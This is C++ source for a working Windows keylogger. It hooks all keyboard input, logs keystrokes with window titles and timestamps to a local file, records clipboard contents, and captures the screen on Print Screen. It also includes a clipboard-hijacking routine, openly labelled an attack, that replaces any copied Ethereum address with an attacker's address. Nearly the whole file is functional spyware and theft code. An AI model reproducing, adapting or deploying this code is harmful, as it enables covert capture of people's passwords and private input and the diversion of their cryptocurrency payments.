#pragma warning(disable: 4996 4530 4577 4365 5204 4191 4668 4626 5045 5264)

#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <atlimage.h>

/* these variables are called globally because there is no way to pass them to the hook callback function as an argument and are needed to update the log file

prevWindowTitle: stores the previous window title after logging.

clipboardSequenceNumber: sequence number for the current clipboard, incremented each time the clipboard is changed, more: https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getclipboardsequencenumber

attackerAddress: Ethereum address to inject
*/

std::wstring	g_prevWindowTitle;
DWORD			g_prevClipboardSequenceNumber;
LPWSTR			attackerAddress = L"0x000000000000000000000000000000000000dEaD";

/* getDate() is called on each log, it uses sprintf to easily get the format we want [DD-MM-YYYY HH:MM:SS], returns a wide string to be written in wide ofstream */

std::wstring getDate() {
	struct tm* timeinfo;
	wchar_t timestr[21];
	time_t rawtime;

	time(&rawtime);
	timeinfo = localtime(&rawtime);
	swprintf(timestr, L"[%02d-%02d-%d %02d:%02d:%02d]", timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
	return (timestr);
}

/* getWindowTitle() is also called on each log, it gets the the foreground process ID then calls GetWindowText to get the window title, returns a wide string to be written in wide ofstream */

std::wstring getWindowTitle(){
	HWND fgw = GetForegroundWindow();
	wchar_t windowtitle[256];

	GetWindowTextW(fgw, windowtitle, sizeof(windowtitle));
	return (windowtitle);
}

/* writeLogs() Writes the date, window title and buffer content to the logfile.
the local needs to be associated with imbue() to the wide file stream in order to write any unicode to the file */

void writeLogs(std::wstring buf, std::wstring windowTitle) {
		const std::locale utf8_locale = std::locale("en_US.UTF-8");
	std::wofstream logfile;

	logfile.open("logs.txt", std::ios::app);
	logfile.imbue(utf8_locale);
	logfile << getDate();
	logfile << L" - '";
	logfile << windowTitle;
	logfile << L"' - ";
	logfile << buf << std::endl;
	logfile.close();
}

/* WriteErrorLog is a called rarely when an error occurs in win32api functions for a debugging purposes */

void writeErrorLog(std::wstring errorMessage){
	const std::locale utf8_locale = std::locale("en_US.UTF-8");
	std::wofstream logfile;

	logfile.open("logs.txt", std::ios::app);
	logfile.imbue(utf8_locale);
	logfile << std::endl << L"!!! ERROR !!! : *";
	logfile << errorMessage << "*" << std::endl << std::endl;
}


/* getClipboardText is called in each clipboard change to log it, It is callig GetClipboardData with the unicode flag to return clipboard text written in any language */

std::wstring getClipboardText(){
	if (OpenClipboard(NULL) == 0){
		writeErrorLog(L"Error in opening clipboard");
		return (L"");
	}
	HANDLE hdata = GetClipboardData(CF_UNICODETEXT);
	wchar_t *pszText = static_cast<wchar_t *>( GlobalLock(hdata) );
	if (pszText == NULL){
		CloseClipboard();
		return (L"[Non-Text Copy]");
	}
	std::wstring text(pszText);
	CloseClipboard();
	return (text);
}

bool isEthAddress(std::wstring cbText){
	if (cbText.compare(0, 2, L"0x") == 0 && cbText.find_first_not_of(L"0123456789abcdefABCDEF", 2) == std::string::npos && cbText.length() == 42 && wcscmp(cbText.c_str(), attackerAddress) != 0) {
		return TRUE;
	}
	return FALSE;
}

/* clipboardAttack is a famous attack in the crypto space, it will scan your clipboard for any cryptocurrency address, when copied it will be immediately replaced with the attacker's address.
This function check if the new clipboard data is an ethereum address then allocates a global memory object for the attacker's address to be copied to clipboard instead */

void clipboardAttack(){
	std::wstring	cbText;
	HGLOBAL 		dstHandle;
	LPWSTR			dstEthAddress;
	DWORD			len;

	len = wcslen(attackerAddress); // Should be 42
	cbText = getClipboardText();
	if (isEthAddress(cbText)){
		dstHandle = GlobalAlloc(GMEM_MOVEABLE,  (len + 1) * sizeof(WCHAR));
		dstEthAddress = (LPWSTR)GlobalLock(dstHandle);
		memcpy(dstEthAddress, attackerAddress, len * sizeof(WCHAR));
		dstEthAddress[len] = NULL;
		GlobalUnlock(dstHandle);

		if (OpenClipboard(NULL) == 0){
		writeErrorLog(L"Error in opening clipboard");
		return ;
		}
		EmptyClipboard();
		SetClipboardData(CF_UNICODETEXT, dstHandle);
		CloseClipboard();
	}
}

/* writeClipboardChange() is called whenever the clipboard updates (ClipboardSequenceNumber is changed), it calls getClipboardText() then write it in log file */

void writeClipboardChange(){
	const std::locale utf8_locale = std::locale("en_US.UTF-8");
	std::wofstream logfile;

	logfile.open("logs.txt", std::ios::app);
	logfile.imbue(utf8_locale);
	logfile << std::endl << L"***ClipBoard Change*** : *";
	logfile << getClipboardText() << "*" << std::endl << std::endl;
}

/* Similar to getDate() but without the ':' since they aren't allowed in windows filenames */

std::string	getScreenFileName() {
	struct tm* timeinfo;
	char timestr[23];
	time_t rawtime;

	time(&rawtime);
	timeinfo = localtime(&rawtime);
	sprintf(timestr, "%02d-%02d-%d %02d_%02d_%02d.png", timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
	return (timestr);
}

/* saveScreenToFile creates an instance of CImage class then calls the save method to save the bitmap to a .png file */

void	saveScreenToFile(HBITMAP hBitmap){
	CImage image;
	image.Attach(hBitmap);
	std::string filename = getScreenFileName();
	image.Save(filename.c_str());
}

/* takeScreen() first sets the awareness context for window to get the correct screen dimensions then create a compatible bitmap*/

void	takeScreen(){
	int x1, y1, x2, y2, w, h;

	// get screen dimensions
	::SetThreadDpiAwarenessContext(DPI_AWARENESS_CONTEXT_SYSTEM_AWARE);
    x1  = GetSystemMetrics(SM_XVIRTUALSCREEN);
    y1  = GetSystemMetrics(SM_YVIRTUALSCREEN);
    x2  = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    y2  = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    w   = x2 - x1;
    h   = y2 - y1;

	// copy screen to bitmap
    HDC     hScreen = GetDC(NULL);
    HDC     hDC     = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);

    SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
	saveScreenToFile(hBitmap);
}

/* TranslateKeys() is called on each keypress and simply converts the key press from vkCode to a writable character
-if vkCode == special key: returns a descriptive wstring for that key.
-else ToUnicodeEx() is called to return the proper unicode to handle all languages and special characters.*/

std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
	std::wstring result;

	if (vkCode == VK_SPACE)
		result = L" ";
	else if (vkCode == VK_RETURN)
		result = L"\n";
	else if (vkCode == VK_BACK)
		result = L"[DEL]";
	else if (vkCode == VK_TAB)
		result = L"\t";
	else if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT)
		result = L"[SHIFT]";
	else if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL)
		result = L"[CTRL]";
	else if (vkCode == VK_LMENU || vkCode == VK_RMENU)
		result = L"[ALT]";
	else if (vkCode == VK_CAPITAL)
		result = L"[CAPS]";
	else if (vkCode == VK_ESCAPE)
		result = L"[ESC]";
	else if (vkCode == VK_LEFT)
		result = L"[LEFT ARROW]";
	else if (vkCode == VK_RIGHT)
		result = L"[RIGHT ARROW]";
	else if (vkCode == VK_UP)
		result = L"[UP ARROW]";
	else if (vkCode == VK_DOWN)
		result = L"[DOWN ARROW]";
	else if (vkCode == VK_SNAPSHOT){
		result = L"[PRINT SCREEN]";
		takeScreen();
	}
	else if (vkCode == VK_NUMLOCK)
		result = L"[NUMLOCK]";
	else if (vkCode == VK_LWIN)
		result = L"[WINDOWS]";
	else if (vkCode == 255){
		result = L"[FN]";
	}
	else if (vkCode >= 112 && vkCode <=120){
		result = L"[F";
		result += std::to_wstring(vkCode-63); // 112-63=49(ascii for '1');		
		result += L']';
	}
	else if (vkCode == 121)
		result = L"[F10]";
	else if (vkCode == 122)
		result = L"[F11]";
	else if (vkCode == 123)
		result = L"[F12]";
	else{
		HWND hForegroundProcess = GetForegroundWindow();
		BYTE lpKeyState[256] = {0};
		wchar_t buff[2];
		DWORD dwThreadID = GetWindowThreadProcessId(hForegroundProcess, NULL);
		HKL keyboardLayout = GetKeyboardLayout(dwThreadID);
		GetKeyState(VK_SHIFT);
        GetKeyState(VK_MENU);
		if (GetKeyboardState(lpKeyState) == 0){
			writeErrorLog(L"Keyboard State return error.");
			return (L"");
		}
		if (GetKeyState(VK_CONTROL) & 0x8000){
			lpKeyState[VK_CONTROL] = 0;
		}
		ToUnicodeEx(vkCode, scanCode, lpKeyState, buff, 2, 0, keyboardLayout);
		result += buff[0];
	}
	return result;
}

/* The CallBack function needed by SetWindowsHookEx to handle the low-level keyboard hooks */

LRESULT CALLBACK keyboardHook(int code, WPARAM wParam, LPARAM lParam){
    KBDLLHOOKSTRUCT *s = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
    std::wstring finalChar;
	static std::wstring buf; // static to not reset after each keyboardHook call
	std::wstring currentWindowTitle;
	DWORD currentClipboardSequenceNumber;

    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
		currentWindowTitle = getWindowTitle();
		currentClipboardSequenceNumber = GetClipboardSequenceNumber();
		if (currentClipboardSequenceNumber != g_prevClipboardSequenceNumber){
			writeClipboardChange();
			clipboardAttack();
			g_prevClipboardSequenceNumber = currentClipboardSequenceNumber;
		}
		if (buf.length() >= 100 || (currentWindowTitle != g_prevWindowTitle && buf.length() > 0)){
					writeLogs(buf, g_prevWindowTitle);
					buf.clear();
					g_prevWindowTitle = currentWindowTitle;
				}
        finalChar = translateKeys(s->vkCode, s->scanCode);
        buf += finalChar;
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}

void main() {
    HHOOK keyboard;
    
    g_prevWindowTitle = getWindowTitle();
	g_prevClipboardSequenceNumber = GetClipboardSequenceNumber();
    keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, &keyboardHook, 0, 0);
    MSG message;
    while (GetMessage(&message, NULL, NULL, NULL) > 0) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
    UnhookWindowsHookEx(keyboard);
}
